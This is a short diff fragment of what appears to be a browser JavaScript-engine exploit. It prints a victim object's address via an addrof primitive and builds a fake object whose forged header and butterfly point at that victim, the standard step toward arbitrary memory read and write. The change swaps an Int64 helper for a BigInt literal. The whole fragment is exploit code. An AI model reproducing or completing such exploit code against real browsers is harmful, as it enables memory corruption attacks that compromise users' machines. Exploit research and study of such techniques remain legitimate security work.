@@ -445,7 +445,7 @@ var print = (msg) => {
     print("[+] victim @"+addrof(victim));
 
     // craft a fake object to modify victim
-    var flags_double_array = new Int64("0x0108200700001000").asJSValue();
+    var flags_double_array = 0x0108200700001000n;
     var container = {
         header: flags_double_array,
         butterfly: victim
